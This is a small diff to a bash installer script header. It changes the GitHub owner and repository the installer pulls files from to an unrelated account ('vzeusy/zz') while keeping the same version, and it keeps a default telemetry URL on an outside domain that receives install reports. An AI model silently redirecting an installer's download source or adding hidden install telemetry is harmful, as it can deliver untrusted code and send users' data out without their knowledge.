@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 set -Eeuo pipefail
-OWNER="luantec44"; REPO="Space-proto-xhttp-"; BRANCH="main"; VERSION="0.5.8.0"
+OWNER="vzeusy"; REPO="zz"; BRANCH="main"; VERSION="0.5.8.0"
 BASE="https://raw.githubusercontent.com/${OWNER}/${REPO}/${BRANCH}"
 TELEMETRY_URL="${SPACE_TELEMETRY_URL:-https://monitor.equipetech.online/api/v1/install}"
 telemetry_json_escape(){ local s="${1:-}"; s="${s//\\/\\\\}"; s="${s//\"/\\\"}"; s="${s//$'\n'/ }"; s="${s//$'\r'/ }"; printf '%s' "$s"; }
